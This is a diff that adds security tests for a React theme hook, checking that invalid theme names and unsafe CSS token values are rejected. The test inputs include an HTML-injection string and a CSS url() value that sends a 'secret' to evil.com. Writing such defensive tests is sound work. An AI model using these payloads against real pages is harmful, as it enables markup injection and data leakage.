@@ -70,6 +70,30 @@ describe("useTheme", () => {
     expect(document.documentElement.style.getPropertyValue("--evil-key")).toBe("");
   });
 
+  it("rejects invalid theme enum — does not set data-theme", () => {
+    const bridge = makeBridge();
+    renderHook(() => useTheme(bridge));
+    bridge.fire({ theme: "hacker", chatTheme: "default", codeTheme: "light" });
+    expect(document.documentElement.hasAttribute("data-theme")).toBe(false);
+  });
+
+  it("rejects invalid chatTheme enum — does not set data-chat-theme", () => {
+    const bridge = makeBridge();
+    renderHook(() => useTheme(bridge));
+    bridge.fire({ theme: "dark", chatTheme: '"><img src=x>', codeTheme: "dark" });
+    expect(document.documentElement.hasAttribute("data-chat-theme")).toBe(false);
+  });
+
+  it("rejects unsafe token values (url injection)", () => {
+    const bridge = makeBridge();
+    renderHook(() => useTheme(bridge));
+    bridge.fire({
+      theme: "dark", chatTheme: "default", codeTheme: "dark",
+      tokens: { "--lvis-bg": "url(https://evil.com?leak=secret)" },
+    });
+    expect(document.documentElement.style.getPropertyValue("--lvis-bg")).toBe("");
+  });
+
   it("does not throw on null payload", () => {
     const bridge = makeBridge();
     renderHook(() => useTheme(bridge));
